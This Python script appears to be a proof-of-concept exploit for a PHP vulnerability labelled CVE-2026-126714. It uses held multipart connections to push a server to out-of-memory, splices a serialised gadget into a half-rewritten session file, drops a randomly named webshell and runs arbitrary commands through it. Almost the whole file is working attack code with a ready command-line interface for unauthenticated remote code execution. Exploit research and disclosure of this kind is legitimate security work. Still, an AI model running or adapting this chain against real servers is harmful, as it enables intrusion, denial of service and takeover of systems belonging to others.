#!/usr/bin/env python3
"""
100% remote (HTTP-only) exploit chain for CVE-2026-126714 (phpAfterShell).

Everything travels over plain HTTP to the target - no docker, no cgroup
access, no local file system access, and NO help from the target: the
bundled app exposes no diagnostic endpoint, no state dump and no helper
route. The interrupted pwrite() is produced the way a real remote
attacker does it: by driving the target's own memory-bounded cgroup
(e.g. a container with mem_limit) to the edge with held connections
while the victim request is inside its session rewrite.

Chain:
  1. carrier upload-progress request (held)      -> progress record on disk
  2. ordinary POST stores the gadget payload     -> C = [progress][bio]
  3. filler connections (held, HTTP only)        -> memory pressure
  4. replacement upload-progress request         -> victim rewrites the session
     + burst push to the fillers at the right moment:
       - reclaim evicts C's re-read page cache
       - the victim's own pwrite() then charges the evicted pages,
         exceeds the cgroup limit and is aborted mid-write
       - inode keeps R[0:k] || C[k:]
  5. consumer GET -> session_start() promotes the planted bytes into a
     live FileCache object -> __destruct drops a webshell  -> RCE
  6. GET /<random shell>?c=<command>             -> command output

All tuning runs off NATURAL signals only:
  - the victim connection's own end (eof/rst/timeout, and when it died)
  - PHP's "Failed to decode" warning on the consumer response
  - the webshell probe (a per-run random shell name, so a stale shell
    from another run can never fake a hit)

The pressure is searched with a bracket that slides toward the last
signal and then samples the band - the landing is stochastic at the
edges (the pre-victim state jitters between attempts), so walking the
band beats converging to a point.
"""
from __future__ import annotations

import random
import socket
import sys
import time
import urllib.parse

import lab

# --- geometry (same layout as lab; see README for the derivation) ---------
# Per-filler field bytes (body < post_max_size). Four fillers instead of
# seven: each held filler is a live PHP worker (~3-4MiB of runtime and
# parse buffers that materialize only after the fillers open - measured
# in poc/charge_trace.py), and fewer of them shrinks that unmeasured term
# and the pressure band's spread.
N_FILLERS = 4
F_MAX = 7_000_000              # per-filler field bytes (body < post_max_size)
P_CARRIER_PROGRESS = 336       # carrier progress record length (fixed layout)
P_START = P_CARRIER_PROGRESS + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
H_MIN, H_MAX = 0, 28_000_000   # pressure bracket bounds (h + 4 fillers
                               # must fit below post_max_size)
FAST_EOF_BOOTSTRAP_MS = 450.   # early/late split until this run has seen
                               # enough deaths to calibrate its own


# ------------------------------------------------------------------ HTTP I/O

def _conn(host: str, port: int) -> socket.socket:
    return socket.create_connection((host, port), timeout=15)


def filler_open(host: str, port: int) -> list[socket.socket]:
    """Open held MULTIPART requests with a non-file field.

    The field value is buffered by PHP's RFC1867 parser in process memory
    (anonymous, unreclaimable) as the bytes arrive - that is what makes the
    pressure stick. An urlencoded body would instead be spooled to disk by
    Apache and become reclaimable file cache, which evaporates the moment
    the victim's serialization triggers reclaim.
    """
    socks = []
    b = lab.BOUNDARY
    for i in range(N_FILLERS):
        head = (
            f"POST /index.php HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={b}\r\n"
            f"Content-Length: {F_MAX + 256}\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"--{b}\r\n"
            f'Content-Disposition: form-data; name="f{i}"\r\n\r\n'
        ).encode()
        s = _conn(host, port)
        s.sendall(head)
        socks.append(s)
    return socks


def filler_push(socks: list[socket.socket], per_filler: int) -> int:
    """Send per_filler more bytes of the held field value to every filler,
    concurrently (the burst must land inside a ~10ms window)."""
    import concurrent.futures

    def push_one(s: socket.socket) -> int:
        sent = 0
        chunk = b"A" * 65536
        left = per_filler
        while left > 0:
            n = min(left, len(chunk))
            try:
                s.sendall(chunk[:n])
            except OSError:
                break
            sent += n
            left -= n
        return sent

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(socks) or 1) as ex:
        return sum(ex.map(push_one, socks))


def victim_wait(s: socket.socket, timeout: float) -> tuple[str, float, bytes]:
    """Wait for the victim connection: eof / reset / timeout. Returns
    (event, elapsed_ms, first response bytes)."""
    t0 = time.monotonic()
    s.settimeout(timeout)
    first = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            if not first:
                first = c[:200]
        return "eof", (time.monotonic() - t0) * 1000, first
    except ConnectionResetError:
        return "rst", (time.monotonic() - t0) * 1000, first
    except socket.timeout:
        return "timeout", (time.monotonic() - t0) * 1000, first
    except OSError as e:
        return type(e).__name__, (time.monotonic() - t0) * 1000, first


def _dechunk(data: bytes) -> bytes:
    """Decode a Transfer-Encoding: chunked body (Apache uses it for CGI)."""
    out = b""
    i = 0
    while i < len(data):
        j = data.find(b"\r\n", i)
        if j < 0:
            break
        try:
            n = int(data[i:j], 16)
        except ValueError:
            return data
        if n == 0:
            break
        out += data[j + 2:j + 2 + n]
        i = j + 2 + n + 2
    return out or data


def http_get(host: str, port: int, path: str, sid: str | None = None,
             timeout: float = 15.0) -> bytes:
    extra = f"Cookie: PHPSESSID={sid}\r\n" if sid else ""
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n{extra}"
           f"Connection: close\r\n\r\n").encode()
    s = _conn(host, port)
    s.sendall(req)
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except (socket.timeout, OSError):
        pass
    s.close()
    if b"\r\n\r\n" not in data:
        return data
    head, _, body = data.partition(b"\r\n\r\n")
    if b"transfer-encoding: chunked" in head.lower():
        return _dechunk(body)
    return body


def consumer(host: str, port: int, sid: str, tries: int = 6) -> bytes:
    """GET the consumer page with our sid - the request that makes the
    decoder materialise the planted object and fire its gadget.

    The response body carries the only textual natural signal: PHP's
    "Failed to decode" warning when the file is structurally broken.
    Retried through a target restart (the file survives any process
    death); an empty body means the child died mid-response.
    """
    for _ in range(tries):
        try:
            body = http_get(host, port, "/index.php", sid=sid)
        except OSError:
            time.sleep(0.75)
            continue
        if body:
            return body
        time.sleep(0.5)
    return b""


def probe(host: str, port: int, cmd: str) -> bytes:
    """Probe this run's random webshell; b'' = no shell.

    None-returning transport errors are retried (the target may be
    restarting right after the OOM); a definite 404 is final for this
    attempt: the gadget already fired or it did not.
    """
    for _ in range(4):
        body = lab.probe_shell(port, cmd)
        if body is not None:
            return body
        time.sleep(0.75)
    return b""


# --------------------------------------------------------------- attempt

def build_payload() -> bytes:
    """Same plant as the local stages, for the remote geometry."""
    e_off = lab.e_offset()
    return lab.build_payload(P_START, e_off)


def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
            cmd: str = "id") -> dict:
    """One full remote attempt with pre-loaded pressure.

    Every verdict inside is a NATURAL signal - the target reports
    nothing. The attempt returns the raw observations; the driver maps
    them to a pressure direction (it is the only side that knows this
    run's timing distribution).
    """
    res = {"h": h, "cmd": cmd}

    sid = lab.sid_new()
    res["sid"] = sid

    # carrier: the progress record the victim will rewrite. There is no
    # way to verify it over HTTP without an oracle - the timing is the
    # same contract the local stages use (hold, then store).
    carrier, _ = lab.carrier_hold(sid)
    time.sleep(0.7)

    lab.store_bio(sid, build_payload())
    time.sleep(0.3)

    fillers = filler_open(host, port)
    time.sleep(0.4)
    pushed = filler_push(fillers, h // N_FILLERS)
    res["pushed"] = pushed
    time.sleep(0.4)                 # let the charge settle before the victim

    victim, _ = lab.replacement_hold(sid)
    ev, drop_ms, vresp = victim_wait(victim, timeout=6.0)
    res["victim"] = ev
    res["drop_ms"] = round(drop_ms, 1)
    if vresp:
        res["vresp"] = vresp[:80].decode(errors="replace")

    # Release the pressure BEFORE reading: the consumer has to read the
    # (up to 16 MiB) session file and must not OOM on the way. Only the
    # fillers are released - the victim/carrier stay open, since aborting
    # them would trigger PHP's upload-progress cleanup, which rewrites
    # the session and destroys the mixed state.
    for s in fillers:
        try:
            s.close()
        except OSError:
            pass
    time.sleep(0.3)

    # The consumer fires the gadget (if the splice materialised the
    # object); its body may carry PHP's decode warning.
    body = consumer(host, port, sid)
    res["decode_failed"] = b"Failed to decode" in body
    res["consumer_ok"] = bool(body)

    # The only positive signal: this run's random shell.
    out = probe(host, port, cmd)
    res["hit"] = bool(out)
    if out:
        res["output"] = out.decode(errors="replace")

    for s in [carrier, victim]:
        try:
            s.close()
        except OSError:
            pass
    time.sleep(0.3)
    return res


# --------------------------------------------------------------- driver

def wait_server(host: str, port: int, timeout: float = 20.0) -> bool:
    """Wait until the target answers a real HTTP request.

    A bare connect is not enough: right after a restart the kernel can
    accept into the backlog before apache's accept loop runs, and the
    first send then dies with EPIPE (each occurrence burned an attempt).
    """
    t0 = time.monotonic()
    while time.monotonic() - t0 < timeout:
        try:
            if http_get(host, port, "/", timeout=3):
                return True
        except OSError:
            pass
        time.sleep(0.5)
    return False


def _derive(res: dict, eof_times: list[float]) -> tuple[str, float]:
    """Map natural signals to a pressure direction.

      hit                 -> won (handled by the caller)
      decode warning      -> structurally broken file: no trustworthy
                             direction, hold the pressure
      victim timeout      -> the write completed: the limit was never
                             crossed -> pressure too low
      victim died FAST    -> the OOM struck before/at the write start
                             (early: pressure too high)
      victim died SLOW    -> the OOM struck deeper into the rewrite
                             (late: crossing happened, too far in)

    The fast/slow split calibrates from THIS run's own death times, so
    it does not encode any host's timing (serialisation takes ~70ms on
    one host and ~700ms on another).
    """
    if res.get("decode_failed"):
        return "noise", 0.0
    if res.get("victim") == "timeout":
        return "nooom", 0.0
    if res.get("victim") in ("eof", "rst"):
        ms = float(res.get("drop_ms") or 0.0)
        if len(eof_times) >= 2:
            lo, hi = min(eof_times), max(eof_times)
            split = lo + (hi - lo) / 3 if hi > lo else FAST_EOF_BOOTSTRAP_MS
        else:
            split = FAST_EOF_BOOTSTRAP_MS
        return ("early", ms) if ms <= split else ("late", ms)
    return "noise", 0.0


def exploit(host: str, port: int, command: str, max_attempts: int = 40,
            verbose: bool = True) -> dict:
    lab.set_geometry("big")     # victim RSS must beat the apache master
    lab.HOST, lab.PORT = host, port
    lab.set_shell(lab.new_shell_name())   # per-run shell: no stale hits
    c_len = P_START + lab.L1 + 2
    r_len = (len(lab.r_prefix()) + lab.LEN2 + len(lab.r_suffix())
             + lab.L1 + 17)
    if verbose:
        print(f"[*] target {host}:{port}  |C|={c_len} |R|={r_len} "
              f"window=[{lab.f_offset()}, {lab.e_offset()}) "
              f"k_target={lab.k_target()} shell={lab.shell_path()}")

    # Pre-loaded pressure H (anonymous, held in PHP's multipart parser).
    # The pre-victim state (baseline + filler runtimes + file cache)
    # jitters between attempts, so the landable band moves: bisect it
    # early (pressure too high) against late/nooom (too low), slide a
    # collapsed bracket toward the last signal instead of freezing, and
    # once narrow, SAMPLE the band - within it the landing is stochastic.
    h = 16_000_000
    h_min, h_max = H_MIN, H_MAX
    lo, hi = h_min, h_max      # bracket around the landable pressure
    MIN_W = 4_000_000          # never sample narrower than half the
                               # k-window's width in h units - the
                               # pre-victim state jitters ~1-2MiB and
                               # slides the window under a fixed h
    last_signal = None         # "early" = too high | "low" = too low
    eof_times: list[float] = [] # this run's victim death times (calibration)

    for i in range(1, max_attempts + 1):
        if not wait_server(host, port):
            return {"error": "server unreachable"}
        try:
            res = attempt(host, port, h, c_len, r_len, command)
        except OSError as e:
            # Transient connection loss (e.g. the target is restarting after
            # an OOM): wait for it to come back and retry instead of dying.
            if verbose:
                print(f"    attempt {i}: connection error "
                      f"({type(e).__name__}) - waiting for target")
            wait_server(host, port, timeout=30)
            continue
        if res.get("hit"):
            if verbose:
                print(f"[+] RCE on attempt {i}: "
                      f"{res.get('output', '').strip()[:200]!r}")
            return res

        out, when = _derive(res, eof_times)
        res["outcome"] = out
        if verbose:
            print(f"    attempt {i}: {res}")

        if out == "early" or out == "late":
            eof_times.append(when)      # feeds the fast/slow calibration

        if out == "early":
            # OOM before the write: pressure too high
            hi = h
            last_signal = "early"
        elif out in ("late", "nooom"):
            # the write ran past the window (or never aborted): the
            # pressure is too low
            lo = h
            last_signal = "low"
        # noise (decode warning, odd victim event): hold the bracket

        # A collapsed bracket must slide toward the last signal instead
        # of freezing at one edge: inside the flip zone the SAME h can
        # report early on one attempt and nooom on the next (the state
        # jitters), so point convergence stalls.
        if hi - lo < MIN_W:
            if last_signal == "early":
                hi = min(h_max, h)
                lo = max(h_min, hi - MIN_W)
            elif last_signal == "low":
                lo = max(h_min, h)
                hi = min(h_max, lo + MIN_W)
        # coarse bisection to find the zone, then sample the band
        if hi - lo >= MIN_W * 2:
            h = (lo + hi) // 2
        else:
            h = random.randint(int(lo), int(hi))

    return {"error": "no hit within attempt budget"}


def main() -> int:
    import argparse
    p = argparse.ArgumentParser(
        prog="phpaftershell-poc",
        description="Unauthenticated RCE against CVE-2026-126714 "
                    "(phpAfterShell) over plain HTTP.",
        epilog="example:\n  phpaftershell-poc "
               "--target http://127.0.0.1:8087 --command 'id'\n",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--target", required=True,
                   help="base URL of the target, e.g. http://127.0.0.1:8087")
    p.add_argument("--command", required=True,
                   help="shell command to run on the target")
    p.add_argument("--attempts", type=int, default=40,
                   help="maximum interruption attempts (default 40)")
    p.add_argument("-q", "--quiet", action="store_true")
    a = p.parse_args()

    t = a.target.rstrip("/")
    if "://" not in t:
        t = "http://" + t
    hostport = t.split("://", 1)[1]
    host, _, port = hostport.partition(":")
    port = int(port or 80)

    res = exploit(host, port, a.command, a.attempts, verbose=not a.quiet)
    if res.get("error"):
        print(f"[!] {res['error']}")
        return 2
    print(res.get("output", "").strip())
    return 0


if __name__ == "__main__":
    sys.exit(main())
